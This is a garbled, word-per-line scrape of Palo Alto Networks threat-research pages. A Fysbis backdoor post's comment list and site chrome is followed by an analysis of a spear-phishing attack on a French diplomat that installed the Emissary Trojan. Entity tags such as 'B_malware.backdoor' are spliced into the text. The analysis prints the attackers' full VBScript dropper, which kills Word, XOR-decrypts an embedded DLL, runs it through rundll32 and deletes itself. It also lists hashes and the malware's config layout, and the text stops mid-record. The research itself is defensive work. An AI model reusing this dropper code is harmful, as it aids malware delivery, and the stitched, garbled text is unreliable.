PM

A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor
–
Palo
Alto
Networks
Blog
|
Georgia
2600
Hackers
irc.2600.net
#GA2600

February
16
,
2016
5:10
AM

Russian
cyberspy
group
uses
simple
yet
effective
Linux
Trojan
|
Templar
Shield

February
16
,
2016
9:53
AM

Russian
cyberspy
group
uses
simple
yet
effective
Linux
Trojan
|
AskIT

February
16
,
2016
10:40
AM

Sofacy
Linux
бэкдор
|
Around
Cyber

February
17
,
2016
4:56
AM

Linux
Fysbis B_malware.backdoor
Trojan
,
a
weapon
in
the
Pawn
Storm's
arsenalSecurity
Affairs

February
17
,
2016
4:59
AM

Linux
Fysbis B_malware.backdoor
Trojan
,
a
new
weapon
in
the
Pawn
Storm's
arsenal
­-
Systerity

February
17
,
2016
1:45
PM

Linux
Fysbis B_malware.backdoor
Trojan
,
a
new
weapon
in
the
Pawn
Storm's
arsenal
­-
OSINFO

February
17
,
2016
7:06
PM

HACKERS
RUSOS
UTILIZAN
UN
SENCILLO
PERO
EFECTIVO
TROYANO
PARA
ATACAR
LINUX
|
SR
HADDEN
CONSULTING
GROUP

February
18
,
2016
9:42
PM

Russian
cyberspy
group
uses
simple
yet
effective
Linux
Trojan
|
The
Silicon
Review

February
20
,
2016
2:52
PM

Weekendowa
Lektura
2016-­02-­20
–
bierzcie
i
czytajcie
|
Zaufana
Trzecia
Strona

February
21
,
2016
6:56
PM

FYSBIS分析报告
:
SOFACY的Linux后门
|
z7y
Blog

February
24
,
2016
5:01
PM

What
is
this
Fysbis B_malware.backdoor
Malware
?
|
WARLOCK

February
24
,
2016
5:53
PM

What
is
this
Fysbis B_malware.backdoor
Malware
?
-­
DLIT
Blog

March
1
,
2016
1:18
AM

FYSBIS分析报告
:
SOFACY的Linux后门
|
邪恶十六进制

Post
Your
Comment

Name
*

Email
*

http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/ B_url.normal

8/10

4/3/2016

A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

Website

Post
Comment

Home

Government

Partners

Unit
42
Threat
Intelligence

Technical
Documentation

Advanced
Endpoint
Protection

Get
Updates

Sign
up
to
receive
the
latest
news
,
cyber
threat
intelligence
and
research
from
Unit
42
.

Business
Email

Submit

Subscribe
to
the
Research
Center
Blog

Select
a
Month

Categories
&
Archives

Select
a
Category

More
→

Recent
Posts

Palo
Alto
Networks
News
of
the
Week
–
April
2
posted
by
Anna
Lough
on
April
2
,
2016

Don't
Be
an
April
Fool
:
Inside
a
Common
Phone
Scam
posted
by
Robert
Falcone
on
April
1
,
2016

Channel
Scoop
–
April
1
,
2016
posted
by
Lang
Tibbils
on
April
1
,
2016

How
the
EITest
Campaign's
Path
to
Angler
EK
Evolved
Over
Time
posted
by
Brad
Duncan
on
March
31
,
2016

Top
5
Things
to
Know
Before
You
Go
to
Ignite
Conference
2016
posted
by
Catherine
Crandall
on
March
31
,
2016

More
→

About
Palo
Alto
Networks

Palo
Alto
Networks
is
the
network
security
company
.

Our
innovative
platform
allows
enterprises
,
service
providers
,
and
government
entities
to
secure
their
networks
and
safely
enable
the
increasingly
complex
and
rapidly
growing
number
of
applications
running
on
their
networks
.

The
core
of
Palo
Alto
Networks
'
platform
is
our
next­generation
firewall
,
which
delivers
application
,
user
,
and
content
visibility
and
control
integrated
within
the
firewall
through
its
proprietary
hardware
and
software
architecture
.

Palo
Alto
Networks
products
and
services
can
address
a
broad
range
of
network
security
requirements
,
from
the
datacenter
to
the
network
perimeter
,
as
well
as
the
distributed
enterprise
,
which
includes
branch
offices
and
a
growing
number
of
mobile
devices
.

FOLLOW
US

Facebook

Twitter

Linked
In

You
Tube

Learn
More

Firewalls

Malware

Intrusion
Prevention
System

Intrusion
Detection
System

Denial
of
Service
Attack

Security
Policy

http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/ B_url.normal

9/10

A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

4/3/2016

Network
Security

Data
Center

1.866.320.4788

Privacy
Policy

Legal
Notices

Site
Index

Subscriptions

Copyright
©
2007
-
­2013
Palo
Alto
Networks

http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/ B_url.normal

10/10
08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

We
observed
a
targeted
attack
in
November
directed
at
an
individual
working
for
the
French
Ministry
of
Foreign
Affairs
.

The
attack
involved
a
spear­phishing
email
sent
to
a
single
French
diplomat
based
in
Taipei
,
Taiwan
and
contained
an
invitation
to
a
Science
and
Technology
support
group
event
.

The
actors
attempted
to
exploit
CVE­2014­6332
using
a
slightly
modified
version
of
the
proof­of­
concept
(
POC
)
code
to
install
a
Trojan
called
Emissary B_malware.backdoor
,
which
is
related
to
the
Operation
Lotus B_malware.drop
Blossom I
campaign
.

The
TTPs
used
in
this
attack
also
match
those
detailed
in
the
paper
.

The
targeting
of
this
individual
suggests
the
actors
are
interested
in
breaching
the
French
Ministry
of
Foreign
Affairs
itself
or
gaining
insights
into
relations
between
France
and
Taiwan
.

We
have
created
the
Emissary B_malware.backdoor
tag
for
AutoFocus
users
to
track
this
threat
.

En
garde
!

On
November
10
,
2015
,
threat
actors
sent
a
spear­phishing
email
to
an
individual
at
the
French

Ministry
of
Foreign
Affairs
.

The
subject
and
the
body
of
the
email
suggest
the
targeted
individual
had
been
invited
to
a
Science
and
Technology
conference
in
Hsinchu
,
Taiwan
.

The
e­mail
appears
quite
timely
,
as
the
conference
was
held
on
November
13
,
2015
,
which
is
three
days
after
the
attack
took
place
.

The
email
body
contained
a
link
to
the
legitimate
registration
page
for
the
conference
,
but
the
email
also
had
two
attachments
with
the
following
filenames
that
also
pertain
to
the
conference
:

1
.
蔡英文柯建銘全國科技後援會邀請函.doc
(
translates
to
'
Tsai
Ker
Chien­ming
National
Science
and
Technology
Support
Association
invitations.doc
'
)

2
.
書面報名表格.doc
(
translates
to
'
Written
Application
Form.doc
'
)

Both
attachments
are
malicious
Word
documents
that
attempt
to
exploit
the
Windows
OLE
Automation
Array
Remote
Code
Execution
Vulnerability
tracked
by
CVE­2014­6332
.

Upon
successful
exploitation
,
the
attachments
will
install
a
Trojan
named
Emissary B_malware.backdoor
and
open
a
Word
document
as
a
decoy
.

The
first
attachment
opens
a
decoy
(
Figure
2
)
that
is
a
copy
of
an
invitation
to
a
Science
and
Technology
conference
this
past
November
13th
held
in
Hsingchu
,
Taiwan
,
while
the
second
opens
a
decoy
(
Figure
1
)
that
is
a
registration
form
to
attend
the
conference
.

The
conference
was
widely
advertised
online
and
on
Facebook
,
however
in
this
case
the
invitation
includes
a
detailed
itinerary
that
does
not
seem
to
have
appeared
online
.

The
Democratic
Progressive's
Party
(
DPP
)
Chairwoman
Tsai
Ing­wen
and
DPP
caucus
whip
and
Hsinchu
representative
Ker
Chien­ming
were
the
primary
political
sponsors
of
the
conference
and
are
longtime
political
allies
.

Tsai
Ing­wen
is
the
current
front­
-

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

1/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

runner
for
the
Taiwanese
Presidency
and
Ker
Chien­ming
may
become
Speaker
if
she
wins
.

The
conference
focused
on
using
open
source
technology
,
open
international
recruiting
,
and
partnerships
to
continue
developing
Hsinchu
as
the
Silicon
Valley
of
Taiwan
.

It
particularly
noted
France
as
an
ally
in
this
,
and
France
is
Taiwan's
second
largest
technology
partner
and
fourth
largest
trading
partner
in
Europe
.

Figure
1
Decoy
document
containing
written
application
form

Figure
2
Decoy
document
containing
the
invitation
and
agenda
for
event

Exploiting
CVE-­2014-­6332

The
threat
actors
attempted
to
exploit
CVE­2014­6332
using
the
POC
code
available
in
the
wild
.

The

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

2/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

POC
code
contains
inline
comments
that
explain
how
the
malicious
VBScript
exploits
this
vulnerability
,
so
instead
of
discussing
the
malicious
script
or
exploit
itself
,
we
will
focus
on
the
portions
of
the
script
that
the
threat
actors
modified
.

The
actors
removed
the
explanatory
comments
from
the
VBScript
and
made
slight
modifications
to
the
POC
code
.

The
only
major
functional
difference
between
the
POC
and
the
VBScript
involved
adding
the
ability
to
extract
and
run
both
a
decoy
document
and
payload
.

Figure
3
and
4
compare
the
differing
'
runshell
'
command
within
the
POC
and
the
malicious
documents
used
in
this
attack
.

The
code
in
Figure
3
shows
that
the
POC
does
nothing
more
than
launch
the
notepad.exe
application
upon
successful
exploitation
.

Figure
4
shows
the
malicious
document
creating
a
file
named
'
ss.vbs
'
that
it
writes
a
VBScript
to
using
a
series
of
'
echo
'
statements
.
After
writing
the
VBScript
,
the
malicious
document
executes
the
'
ss.vbs
'
file
.

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

3/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

4/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

function
runshell(
)

On
Error
Resume
Next

set
objshell=
Createobject('WScript.Shell
'
)

strValue
=
objshell.RegRead('HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell

Folders\Local
AppData
'
)
ename
=
'
rundll32'','''''''&strValue&'\mm.dll'''',Setting
'
outfile1=
strValue&'\mm.dll
'
bs
=
strValue&'\ss.vbs
'
dn=
strValue&'\t.doc
'
v=window.location.href
v=Replace(v,'file:///','',1,1,1
)
v=Replace(v,'?.html','',1,1,1
)
v=Replace(v,'%20
'
,
'
'
,1
)
v=Replace(v,'/','\',1
)
cmd
=
'
cmd
'
arg=
'
/c
taskkill
­f
­im
winword.exe
'
arg1=
'
'
'
,
'
'
'
set
shell=createobject('wscript.shell
'
)
shell.run
'
cmd.exe
/c
'
'
echo
On
Error
Resume
Next
>'''&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
set
shell=createobject(''Shell.Application
'
'
)
>>'''&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
shell.ShellExecute
'
'
cmd'','''&arg&''','''','''',0
>>'''&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
wscript.sleep
3000
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
dim
str
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
dim
L1
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
dim
L2
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

5/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
-
Palo
Alto
Networks
Blog

shell.run
'
cmd.exe
/c
'
'
echo
dim
Len
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
dim
infile
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
dim
outfile1
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
dim
outfile2
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
infile
=
'
'
'
&v&
'
'
'
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
outfile1
=
'
'
'
&outfile1&
'
'
'
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
outfile2
=
'
'
'
&dn&
'
'
'
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
L1=
78924
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
L2=
38912
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
size=
144893
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
offset1
=
size­L1­L2
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
offset2
=
size­L2
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
Len=0
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
str
=
ReadBinary
(
infile,L1,offset1
)
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
WriteBinary
outfile1
,
str
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
str
=
ReadBinary
(
infile,L2,offset2
)
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
WriteBinary
outfile2
,
str
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
Function
ReadBinary(FileName,length,offset
)
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
Dim
Buf(
)
,
I
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
With
CreateObject(''ADODB.Stream
'
'
)
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
.Mode
=
3
:
.Type
=
1
:
.Open
:
.LoadFromFile
FileName
:
.Position
=
offset
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

6/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

shell.run
'
cmd.exe
/c
'
'
echo
Len
=length
­1
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
ReDim
Buf(Len
)
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
For
I
=
0
To
Len
:
if(I=0
)
then
Buf(I)=(AscB(.Read(1
)
)
)
else
if
(
(
I
mod
2)=0
)
then
Buf(I)=(AscB(.Read(1
)
)
xor
AscB(chr(65
)
)
)
else
Buf(I)=(AscB(.Read(1
)
)
xor
AscB(chr(67
)
)
)
end
if
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
Next
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
.Close
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
End
With
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
ReadBinary
=
Buf
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
End
Function
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
Sub
WriteBinary(FileName
,
Buf
)
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
Dim
I
,
aBuf
,
Size
,
bStream
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
Size
=
UBound(Buf
)
:
ReDim
aBuf(Size
\
2
)
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
For
I
=
0
To
Size
­
1
Step
2
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
aBuf(I
\
2
)
=
ChrW(Buf(I
+
1
)
*
256
+
Buf(I
)
)
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
Next
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
If
I
=
Size
Then
aBuf(I
\
2
)
=
ChrW(Buf(I
)
)
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
aBuf=Join(aBuf
,
'
'
'
'
)
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
Set
bStream
=
CreateObject(''ADODB.Stream
'
'
)
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
bStream.Type
=
1
:
bStream.Open
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
With
CreateObject(''ADODB.Stream
'
'
)
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
.Type
=
2
:
.Open
:
.WriteText
aBuf
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
.Position
=
2
:
.CopyTo
bStream
:
.Close
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

7/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

shell.run
'
cmd.exe
/c
'
'
echo
End
With
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
bStream.SaveToFile
FileName
,
2
:
bStream.Close
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
Set
bStream
=
Nothing
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
End
Sub
>>
'
'
'
&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
set
shell=createobject(''Shell.Application
'
'
)
>>'''&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
shell.ShellExecute
'
'
'
&dn&
'
'
'
>>'''&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
shell.ShellExecute
'
'
'
&ename&
'
'
'
>>'''&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
Set
xa
=
CreateObject(''Scripting.FileSystemObject
'
'
)
>>'''&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
If
xa.FileExists('''&bs&
'
'
'
)
Then
>>'''&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
Set
xb
=
xa.GetFile('''&bs&
'
'
'
)
>>'''&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
xb.Delete
>>'''&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
echo
End
If
>>'''&bs&
'
'
'
'
'
'
,0,true
shell.run
'
cmd.exe
/c
'
'
'
&bs&
'
'
'
'
,0,true
end
function

Figure
4
Code
block
containing
'
runshell
'
function
in
malicious
VBScript
within
attachment
The
ss.vbs
file
is
responsible
for
locating
the
payload
and
decoy
document
from
the
initial
malicious
document
,
as
well
as
decrypting
,
saving
and
opening
both
of
the
files
.

The
script
has
hardcoded
offsets
to
the
location
of
both
the
payload
and
decoy
document
within
the
initial
document
.

The
script
will
decrypt
both
of
the
embedded
files
using
a
two­byte
XOR
loop
that
skips
the
first
byte
and
then
decrypts
the
remaining
using
'
A
'
and
'
C
'
as
the
key
.

After
decrypting
the
embedded
files
,
the
script
saves
the
decoy
to
'
t.doc
'
and
the
payload
to
'
mm.dll
'
in
the
'
%APPDATA%\LocalData
'
folder
.

Finally
,
the
script
will
open
the
decoy
document
and
launch
the
payload
by
calling
its
exported
function
named
'
Setting
'
.

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

8/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

9/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­
Palo
Alto
Networks
Blog

On
Error
Resume
Next
set
shell=createobject('Shell.Application
'
)
shell.ShellExecute
'
cmd
'
,
'
/c
taskkill
­f
­im
winword.exe
'
,'','',0
wscript.sleep
3000
dim
str
dim
L1
dim
L2
dim
Len
dim
infile
dim
outfile1
dim
outfile2
infile
=
'
C:\Documents
and
Settings\<username>\Desktop\<malicious
document
name>.doc
'
outfile1
=
'
C:\Documents
and
Settings\<username>\Local
Settings\Application

Data\mm.dll
'
outfile2
=
'
C:\Documents
and
Settings\<username>\Local
Settings\Application

Data\t.doc
'

L1=
78924

L2=
38912
size=
144893
offset1
=
size­L1­L2
offset2
=
size­L2

Len=0
str
=
ReadBinary
(
infile,L1,offset1
)

WriteBinary
outfile1
,
str
str
=
ReadBinary
(
infile,L2,offset2
)

WriteBinary
outfile2
,
str

Function
ReadBinary(FileName,length,offset
)

Dim
Buf(
)
,
I

With
CreateObject('ADODB.Stream
'
)
.Mode
=
3
:
.Type
=
1
:
.Open
:
.LoadFromFile
FileName
:
.Position
=
offset

Len
=length
­1

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

10/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

ReDim
Buf(Len
)

For
I
=
0
To
Len
:
if(I=0
)
then
Buf(I)=(AscB(.Read(1
)
)
)
else
if
(
(
I
mod
2)=0
)
then
Buf(I)=
(
AscB(.Read(1
)
)
xor
AscB(chr(65
)
)
)
else
Buf(I)=(AscB(.Read(1
)
)
xor
AscB(chr(67
)
)
)
end
if

Next
.Close

End
With

ReadBinary
=
Buf

End
Function

Sub
WriteBinary(FileName
,
Buf
)

Dim
I
,
aBuf
,
Size
,
bStream

Size
=
UBound(Buf
)
:
ReDim
aBuf(Size
\
2
)

For
I
=
0
To
Size
­
1
Step
2
aBuf(I
\
2
)
=
ChrW(Buf(I
+
1
)
*
256
+
Buf(I
)
)

Next

If
I
=
Size
Then
aBuf(I
\
2
)
=
ChrW(Buf(I
)
)
aBuf=Join(aBuf
,
'
'
)

Set
bStream
=
CreateObject('ADODB.Stream
'
)
bStream.Type
=
1
:
bStream.Open

With
CreateObject('ADODB.Stream
'
)
.Type
=
2
:
.Open
:
.WriteText
aBuf
.Position
=
2
:
.CopyTo
bStream
:
.Close

End
With
bStream.SaveToFile
FileName
,
2
:
bStream.Close

Set
bStream
=
Nothing

End
Sub
set
shell=createobject('Shell.Application
'
)
shell.ShellExecute
'
C:\Documents
and
Settings\<username>\Local
Settings\Application

Data\t.doc
'
shell.ShellExecute
'
rundll32','''C:\Documents
and
Settings\<username>\Local
Settings\Application

Data\mm.dll'',Setting
'

Set
xa
=
CreateObject('Scripting.FileSystemObject
'
)

If
xa.FileExists('C:\Documents
and
Settings\<username>\Local
Settings\Application
Data\ss.vbs
'
)

Then

Set
xb
=
xa.GetFile('C:\Documents
and
Settings\<username>\Local
Settings\Application

Data\ss.vbs
'
)
xb.Delete

End
If

Figure
5
VBScript
within
ss.vbs
responsible
for
extracting
and
running
the
payload
and
decoy

Emissary B_malware.backdoor
5.3
Analysis

The
payload
of
this
attack
is
a
Trojan
that
we
track
with
the
name
Emissary B_malware.backdoor
.

This
Trojan
is
related
to

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

11/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

the
Elise B_malware.backdoor
backdoor
described
in
the
Operation
Lotus B_malware.drop
Blossom I
report
.

Both
Emissary B_malware.backdoor
and
Elise B_malware.backdoor
are
part
of
a
malware
group
referred
to
as
'
LStudio
'
,
which
is
based
on
the
following
debug
strings
found
in
Emissary B_malware.backdoor
and
Elise B_malware.backdoor
samples
:

d:\lstudio\projects\worldclient\emissary\Release\emissary\i386\emissary.pdb

d:\lstudio\projects\lotus\elise\Release\EliseDLL\i386\EliseDLL.pdb

There
is
code
overlap
between
Emissary B_malware.backdoor
and
Elise B_malware.backdoor
,
specifically
in
the
use
of
a
common
function
to
log
debug
messages
to
a
file
and
a
custom
algorithm
to
decrypt
the
configuration
file
.

The
custom
algorithm
used
by
Emissary B_malware.backdoor
and
Elise B_malware.backdoor
to
decrypt
their
configurations
use
the
'
srand
'
function
to
set
a
seed
value
for
the
'
rand
'
function
,
which
the
algorithm
uses
to
generate
a
key
.

While
the
'
rand
'
function
is
meant
to
generate
random
numbers
,
the
malware
author
uses
the
'
srand
'
function
to
seed
the
'
rand
'
function
with
a
static
value
.

The
static
seed
value
causes
the
'
rand
'
function
to
create
the
same
values
each
time
it
is
called
and
results
in
a
static
key
to
decrypt
the
configuration
.

The
seed
value
is
where
the
Emissary B_malware.backdoor
and
Elise B_malware.backdoor
differ
in
their
use
of
this
algorithm
,
as
Emissary B_malware.backdoor
uses
a
seed
value
of
1024
(
as
seen
in
Figure
6
)
and
Elise B_malware.backdoor
uses
the
seed
value
of
2012
.

Figure
6
Custom
algorithm
in
Emissary B_malware.backdoor
using
'
srand
'
and
'
rand
'
with
1024
as
a
seed
value

While
these
two
Trojans
share
code
,
we
consider
Emissary B_malware.backdoor
and
Elise B_malware.backdoor
separate
tools
since
their
configuration
structure
,
command
handler
and
C2
communications
channel
differ
.

The
Emissary B_malware.backdoor
Trojan
delivered
in
this
attack
contains
the
components
listed
in
Table
1
.

At
a
high
level
,
Emissary B_malware.backdoor
has
an
initial
loader
DLL
that
extracts
a
configuration
file
and
a
second
DLL
containing
Emissary's B_malware.backdoor
functional
code
that
it
injects
into
Internet
Explorer
.

Path

06f1d2be5e981dee056c231d184db908 B_hash

%APPDATA%\LocalData\ishelp.dll

6278fc8c7bf14514353797b229d562e8 B_hash

%APPDATA%\LocalData\A08E81B411.DAT

e9f51a4e835929e513c3f30299567abc B_hash

%APPDATA%\LocalData\75BD50EC.DAT

Description

Loader

Emissary B_malware.backdoor

Payload

Configuration
file

varies

%TEMP%\000A758C8FEAE5F.TMP

Log
file

Table
1
Dropped
files
associated
with
Emissary B_malware.backdoor
Trojan
seen
in
attack
on
French
Ministry
of
Foreign
Affairs

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

12/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

The
loader
Trojan
named
'
ishelp.dll
'
had
an
original
name
of
'
Loader.dll
'
,
which
will
extract
the
Emissary B_malware.backdoor
payload
from
a
resource
named
'
asdasdasdasdsad
'
and
write
it
to
a
file
named
'
A08E81B411.DAT
'
.

The
loader
will
then
write
an
embedded
configuration
to
a
file
named
'
75BD50EC.DAT
'
.

The
loader
Trojan
creates
a
mutex
named
'
_MICROSOFT_LOADER_MUTEX_
'
and
finishes
by
injecting
the
Emissary B_malware.backdoor
DLL
in
'
A08E81B411.DAT
'
into
a
newly
spawned
Internet
Explorer
process
.

The
Emissary B_malware.backdoor
Trojan
runs
within
the
Internet
Explorer
process
.

It
begins
by
reading
and
decrypting
its
configuration
file
,
which
has
the
following
structure
:

struct
emissary_config
{

WORD
emissary_version_major;

WORD
emissary_version_minor;

CHAR[36]
GUID_for_sample;

WORD
Unknown1;

CHAR[128]
Server1;

CHAR[128]
Server2;

CHAR[128]
Server3;

CHAR[128]
CampaignName;

CHAR[550]
Unknown2;

WORD
Delay_interval_seconds;

We
decrypted
and
parsed
the
configuration
file
that
accompanied
the
payload
used
in
this
attack
,
which
resulted
in
the
following
settings
:

Version
:
5.3

GUID
:
ba87c1c5­f71c­4a8b­b511­07aa113d9103

C2
Server
1
:
